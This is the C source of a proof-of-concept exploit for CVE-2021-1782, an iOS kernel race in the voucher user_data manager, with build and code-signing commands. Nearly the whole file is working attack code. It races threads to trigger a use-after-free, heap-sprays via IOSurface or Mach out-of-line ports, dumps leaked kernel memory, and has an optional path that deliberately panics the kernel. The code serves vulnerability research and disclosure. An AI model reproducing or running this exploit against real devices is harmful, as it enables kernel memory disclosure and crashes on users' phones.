
/* 

This is a PoC for CVE-2021-1782, a XNU kernel vulnerability for iOS <= 14.3.
The bug is a lack of locks in user_data_get_value() on the user_data voucher attribute manager.
With a double race we can manage to get an user_data_element_t used after free.
For more details see Synacktiv's blog post on: https://www.synacktiv.com/publications/analysis-and-exploitation-of-the-ios-kernel-vulnerabilty-cve-2021-1782 .

On iOS 13 the bug will leak kernel data around an OSData allocation

To compile:
   
   xcrun --sdk iphoneos clang -arch arm64 -framework IOKit voucher_leak.c iosurface.c log.c -O3 -o voucher_leak
   codesign -s - voucher_leak --entitlement entitlements.xml  -f

The technique will not work on iOS 14 but if you want to demonstrate a kernel panic you can try with -DWITH_OOL

Credits to Brandon Azad for iosurface.c iosurface.h log.c log.h IOKitLib.h

*/

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>

#include <mach/mach.h>


#include "iosurface.h"
#include "log.h"

#define MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE   5120
#define MACH_VOUCHER_TRAP_STACK_LIMIT                 256

#define NB_DESYNC_THREADS 2
#define REDEEM_MULTIPLE_SIZE 256
#define RECIPE_ATTR_MAX_SIZE 5120

// 1008 == 5120 - (256+1) * sizeof(mach_voucher_attr_recipe_data_t)
#define VOUCHER_CONTENT_SIZE 1008 // make a 1008 + sizeof(user_data_value_element) == 1040 bytes kalloc()

#ifdef WITH_OOL
#define NB_MSG 128
#define NB_OOL_PORTS 130 // 130 * 8 == 1040 == 1008 + sizeof(user_data_value_element)
#define NB_DESC 1
#endif

#define ENFORCE(a, label) \
    do { \
        if (__builtin_expect(!(a), 0)) \
        { \
            ERROR("%s is false (l.%d)", #a, __LINE__); \
            goto label; \
        } \
    } while (0)

/* from https://gist.github.com/ccbrown/9722406#file-dumphex-c */
static void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

#pragma pack(push, 4)
struct store_recipe
{
        mach_voucher_attr_recipe_data_t recipe;
        uint64_t nonce;
        uint8_t padding[VOUCHER_CONTENT_SIZE-sizeof(uint64_t)];
};

struct multi_redeem_recipe
{
    mach_voucher_attr_recipe_data_t store_recipe;
    uint64_t nonce;
    uint8_t padding[VOUCHER_CONTENT_SIZE-sizeof(uint64_t)];
    mach_voucher_attr_recipe_data_t redeem_recipe[REDEEM_MULTIPLE_SIZE];
};

struct user_data_value_element
{
    uint32_t     e_made;
    uint32_t     e_size;
    uint32_t                              e_sum;
    uint32_t                              e_hash;
    uint64_t                           e_hash_link_next;
    uint64_t                           e_hash_link_prev;
    uint8_t                                 e_data[];
};
typedef struct user_data_value_element *user_data_element_t;
#pragma pack(pop)

/* this is a really lousy way of sync'ing but it works pretty ok */
enum race_sync_flag_e
{
    RACE_SYNC_STOPPED,
    RACE_SYNC_SPRAY_SETUP_READY,
    RACE_SYNC_SPRAY_GO,
    RACE_SYNC_ENTER_CRITICAL_SECTION,
    RACE_SYNC_SPRAY_DONE,
    RACE_SYNC_SPRAY_CLEANABLE,
};
typedef enum race_sync_flag_e race_sync_flag_t;



volatile uint64_t g_race_sync = 0;
volatile uint64_t g_spray_abort_flag = 0;
volatile mach_port_t g_voucher_port = MACH_PORT_NULL;



static int voucher_user_data_store(volatile mach_port_t *out_port, uint64_t nonce)
{
    struct store_recipe store_r = {0};
    store_r.recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    store_r.recipe.command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
    store_r.recipe.content_size = VOUCHER_CONTENT_SIZE;
    store_r.nonce = nonce,
    memset(store_r.padding, 0, sizeof(store_r.padding));

    mach_port_t port = MACH_PORT_NULL;
    ENFORCE(host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&store_r, sizeof(store_r), &port) == KERN_SUCCESS, fail);

    *out_port = port;
    return 0;
fail:
    return -1;
}

static int voucher_user_redeem_multiple(mach_port_t *out_port, uint64_t nonce, uint32_t number)
{

    struct multi_redeem_recipe multi = {0};

    multi.store_recipe.key          = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    multi.store_recipe.command      = MACH_VOUCHER_ATTR_USER_DATA_STORE;
    multi.store_recipe.content_size = VOUCHER_CONTENT_SIZE;
    multi.store_recipe.previous_voucher = MACH_PORT_NULL;
    multi.nonce = nonce;
    memset(multi.padding, 0, sizeof(multi.padding));

    for (uint64_t i = 0; i < number; i++)
    {
        multi.redeem_recipe[i].key          = MACH_VOUCHER_ATTR_KEY_USER_DATA;
        multi.redeem_recipe[i].command      = MACH_VOUCHER_ATTR_REDEEM;
        multi.redeem_recipe[i].content_size = 0;
        multi.redeem_recipe[i].previous_voucher = MACH_PORT_NULL;
    }

    mach_port_t port = MACH_PORT_NULL;
    ENFORCE(host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&multi, 
        sizeof(mach_voucher_attr_recipe_data_t) + VOUCHER_CONTENT_SIZE + number * sizeof(mach_voucher_attr_recipe_data_t),
         &port) == KERN_SUCCESS, fail);

    *out_port = port;
    return 0;
fail:
    return -1;
}

#ifdef WITH_OOL
static int voucher_user_redeem_with_prev(mach_port_t *out_port, mach_port_t prev)
{

    mach_voucher_attr_recipe_data_t recipe = {0};

    recipe.key          = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipe.command      = MACH_VOUCHER_ATTR_REDEEM;
    recipe.content_size = 0;
    recipe.previous_voucher = prev;

    mach_port_t port = MACH_PORT_NULL;
    ENFORCE(host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&recipe,
        sizeof(recipe), &port) == KERN_SUCCESS, fail);

    *out_port = port;
    return 0;
fail:
    return -1;
}
#endif

static void* race_store(void *arg)
{
    uint64_t nonce = (uint64_t)arg;
    mach_port_t port = MACH_PORT_NULL; 

    while( (g_race_sync != RACE_SYNC_ENTER_CRITICAL_SECTION)
        && (g_race_sync != RACE_SYNC_SPRAY_DONE)) {};

    ENFORCE(voucher_user_data_store(&port, nonce) == 0, fail);
    DEBUG_TRACE(5, "race_store => new port:0x%x nonce:%llu", port, nonce);

    g_voucher_port = port;

fail:
    return NULL;
}

static void* race_desync(void *args)
{
    uint64_t nonce = (uint64_t) args;
    mach_port_t port = MACH_PORT_NULL;

    while(g_race_sync != RACE_SYNC_ENTER_CRITICAL_SECTION){};

    ENFORCE(voucher_user_redeem_multiple(&port, nonce, REDEEM_MULTIPLE_SIZE) == 0, fail);
    DEBUG_TRACE(5, "race_desync port:0x%x", port);

fail:
    return NULL;
}

static void* race_destroy(void *args)
{
    mach_port_t port = (mach_port_t)args;

    while( (g_race_sync != RACE_SYNC_ENTER_CRITICAL_SECTION)
        && (g_race_sync != RACE_SYNC_SPRAY_DONE)) {};

    ENFORCE(mach_port_destroy(mach_task_self(), port) == 0, fail);
    DEBUG_TRACE(5, "race_dealloc port:0x%x", port);

fail:
    return NULL;
}

#ifndef WITH_OOL
/* spraying in another thread doesn't really make sense now ... */
static void* race_spray(__attribute__((unused)) void *args)
{
    DEBUG_TRACE(5, "preparing the spray");
    uint8_t sprayed_data[sizeof(struct user_data_value_element) + VOUCHER_CONTENT_SIZE];
    memset(sprayed_data, 'A', sizeof(sprayed_data));

    user_data_element_t sprayed_elem = (user_data_element_t)sprayed_data;
    sprayed_elem->e_made = 0x100;
    sprayed_elem->e_size = RECIPE_ATTR_MAX_SIZE - sizeof(mach_voucher_attr_recipe_data_t) - 1;

    g_race_sync = RACE_SYNC_SPRAY_SETUP_READY;
    while(g_race_sync != RACE_SYNC_SPRAY_GO){};

    DEBUG_TRACE(5, "spraying...");
    ENFORCE(IOSurface_spray_with_gc(1, 1, sprayed_data, sizeof(sprayed_data), NULL) == true, fail);

    g_race_sync = RACE_SYNC_SPRAY_DONE;
    while(g_race_sync != RACE_SYNC_SPRAY_CLEANABLE){};

    if (g_spray_abort_flag == 1)
    {
        return NULL;
    }

    DEBUG_TRACE(5, "cleaning the spray");
    ENFORCE(IOSurface_spray_clear(1) == true, fail);
    
fail:
    return NULL;
}
#endif // WITH_OOL

#ifdef WITH_OOL
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

struct ool_msg
{
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct ool_rcv_msg
{
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    mach_msg_trailer_t trailer;
};

struct ool_multi_msg
{
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[NB_DESC];
};

struct ool_multi_msg_rcv
{
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[NB_DESC];
    mach_msg_trailer_t trailer;
};

static int send_ool_ports(mach_port_t port, mach_port_t *ool_ports)
{
    size_t n_ports = NB_OOL_PORTS;
    struct ool_multi_msg msg = {0};

    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.hdr.msgh_size = sizeof(struct ool_msg);
    msg.hdr.msgh_remote_port = port;
    msg.hdr.msgh_local_port = MACH_PORT_NULL;
    msg.hdr.msgh_id = 0x123456;
  
    msg.body.msgh_descriptor_count = NB_DESC;
    for (uint64_t i = 0; i < NB_DESC; i++)
    {
        msg.ool_ports[i].address = ool_ports;
        msg.ool_ports[i].count = n_ports;
        msg.ool_ports[i].deallocate = 0;
        msg.ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg.ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg.ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }
  
    ENFORCE(mach_msg(&msg.hdr, MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_multi_msg), 0,
                 MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == KERN_SUCCESS, fail);

    return 0;
fail:
    return 1;
}

static int receive_ool_ports(mach_port_t port)
{
    struct ool_multi_msg_rcv msg = {0};
    ENFORCE(mach_msg(&msg.hdr, MACH_RCV_MSG, 0, sizeof(struct ool_multi_msg_rcv),
                 port, 0, 0) == KERN_SUCCESS, fail);
  
    return 0;
fail:
    return 1;
}

static void* spray_with_ool(void *args)
{
    mach_port_t port;
    mach_port_t ports[NB_MSG] = {0};
    mach_port_t ool_ports[NB_MSG*NB_OOL_PORTS] = {0};
    
    DEBUG_TRACE(5, "preparing ports");
    for(uint64_t i = 0; i < NB_MSG;i++)
    { 
        ENFORCE(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) == KERN_SUCCESS, fail);
        ports[i] = port;
        for(uint64_t j = 0; j < NB_OOL_PORTS;j++)
        {
            ool_ports[i*NB_MSG+j] = mach_task_self();
        }
    }

    g_race_sync = RACE_SYNC_SPRAY_SETUP_READY;
    //while(g_race_sync != RACE_SYNC_ENTER_CRITICAL_SECTION){};
    while(g_race_sync != RACE_SYNC_SPRAY_GO){};

    DEBUG_TRACE(5, "spraying");
    for(uint64_t i = 0; i < NB_MSG; i++)
    {
        ENFORCE(send_ool_ports(ports[i], &ool_ports[i*NB_MSG]) == 0, fail);
    }

    g_race_sync = RACE_SYNC_SPRAY_DONE;
    while(g_race_sync != RACE_SYNC_SPRAY_CLEANABLE) {};

    DEBUG_TRACE(5, "recv");
    for(uint64_t i = 0; i < NB_MSG; i++)
    {
        ENFORCE(receive_ool_ports(ports[i]) == 0, fail);
    }

fail:
    DEBUG_TRACE(5, "cleaning up ports");
    for(uint64_t i = 0; i < NB_MSG; i++)
    {
        if (ports[i] != 0)
        {
            mach_port_destroy(mach_task_self(), ports[i]);
            mach_port_deallocate(mach_task_self(), ports[i]);
        }
    }

    return NULL;    
}
#endif // WITH_OOL


int main(int argc, char* argv[])
{
    kern_return_t kerr;
    uint64_t nonce = 0;

    pthread_t desync_theads[NB_DESYNC_THREADS] = {0};
    pthread_t store_thread = 0;
    pthread_t destroy_thread = 0;
    pthread_t spray_thread = 0;
    
    sranddev();
    
    mach_msg_type_number_t recipe_size       = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
    mach_msg_type_number_t recipe_legit_size = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
    void *recipe = malloc(recipe_size);
    ENFORCE(recipe != NULL, fail);
    memset(recipe, 0, recipe_size);

    uint64_t nb_attempts = 10000;
    if (argc >= 2)
    {
        nb_attempts = atoll(argv[1]);
    }

    for(uint64_t attempt = 0; attempt < nb_attempts; attempt++)
    {
        nonce = rand();

        g_race_sync = RACE_SYNC_STOPPED;

        DEBUG_TRACE(5, "--------------------------");
        ENFORCE(voucher_user_data_store(&g_voucher_port, nonce) == 0, fail);
        DEBUG_TRACE(5, "voucher_user_data_store => voucher:0x%x", g_voucher_port);

        if (attempt == 0)
        {
            ENFORCE(mach_voucher_extract_attr_recipe_trap(g_voucher_port, MACH_VOUCHER_ATTR_KEY_USER_DATA, recipe, &recipe_legit_size) == KERN_SUCCESS, fail);
            INFO("legit recipe_size:%u", recipe_legit_size);
            //hexdump(recipe, recipe_size);
        }

        DEBUG_TRACE(5, "---------(desync)---------");
        for(uint32_t i = 0; i < NB_DESYNC_THREADS; i++)
        {
            ENFORCE(pthread_create(&desync_theads[i], NULL, race_desync, (void*)nonce) == 0, fail);
        }

        g_race_sync = RACE_SYNC_ENTER_CRITICAL_SECTION;

        for(uint32_t i = 0; i < NB_DESYNC_THREADS; i++)
        {
            ENFORCE(pthread_join(desync_theads[i], NULL) == 0, fail);
        }

        g_race_sync = RACE_SYNC_STOPPED;

        if ((attempt % 1000) == 0)
        {
            INFO("attempt number:%llu", attempt);
        }

        DEBUG_TRACE(5, "---------(release)--------");
        mach_port_t port_to_release = g_voucher_port;

#ifdef WITH_OOL
        ENFORCE(pthread_create(&spray_thread, NULL, spray_with_ool, NULL) == 0, fail);
#else
        ENFORCE(pthread_create(&spray_thread, NULL, race_spray, NULL) == 0, fail);
#endif
        while(g_race_sync != RACE_SYNC_SPRAY_SETUP_READY) {};

        ENFORCE(pthread_create(&store_thread, NULL, race_store, (void*)nonce) == 0, fail);
        void *_cast = (void*)(uintptr_t) port_to_release; // compiler happy :)
        ENFORCE(pthread_create(&destroy_thread, NULL, race_destroy, (void*)_cast) == 0, fail);

        g_race_sync = RACE_SYNC_ENTER_CRITICAL_SECTION;
        
        ENFORCE(pthread_join(store_thread, NULL) == 0, fail);
        ENFORCE(pthread_join(destroy_thread, NULL) == 0, fail);
        
        g_race_sync = RACE_SYNC_SPRAY_GO;
        while(g_race_sync != RACE_SYNC_SPRAY_DONE) {};
        
        DEBUG_TRACE(5,"Checking recipe size with port 0x%x", g_voucher_port);
        recipe_size = RECIPE_ATTR_MAX_SIZE;
        kerr = mach_voucher_extract_attr_recipe_trap(g_voucher_port, MACH_VOUCHER_ATTR_KEY_USER_DATA, recipe, &recipe_size);
        if (kerr == KERN_SUCCESS)
        {
            if (recipe_size != recipe_legit_size)
            {
                INFO("UaF after %llu attempts", attempt);
                INFO("recipe_size was corrupted:0x%x instead of 0x%x!", recipe_size, recipe_legit_size);
                hexdump(recipe, recipe_size);
                
                g_spray_abort_flag = 1;
                g_race_sync = RACE_SYNC_SPRAY_CLEANABLE;

                return 0;
            }
        }
        else if (kerr == KERN_NO_SPACE)
        {
            INFO("UaF detected with KERN_NO_SPACE!"); /* another one got our free chunk */
#ifdef WITH_OOL
            INFO("our ool ports probably got our alloc");
            INFO("let's try to panic...");
            mach_port_t new_voucher;
            
            INFO("3");
            sleep(1);
            INFO("2");
            sleep(1);
            INFO("1");
            sleep(1);
            voucher_user_redeem_with_prev(&new_voucher, g_voucher_port); // this will increment an ool port addr
            /* this will make the spray tread recv with a corrupted unaligned pointer, then panic */
            g_race_sync = RACE_SYNC_SPRAY_CLEANABLE;
            pthread_join(spray_thread, NULL);
            usleep(100);
            mach_port_destroy(mach_task_self(), g_voucher_port);
            mach_port_destroy(mach_task_self(), new_voucher);
            continue;
#else
            INFO("someone else got our alloc");
#endif
        }

        else
        {
            DEBUG_TRACE(8, "error mach_voucher_extract_attr_recipe_trap():%x", kerr); /* no luck this time */
        }

        g_race_sync = RACE_SYNC_SPRAY_CLEANABLE;
        pthread_join(spray_thread, NULL);
        usleep(100);
        
        /* clean up*/
        mach_port_destroy(mach_task_self(), g_voucher_port);
    }

    return 0;
fail:
    return 1;
}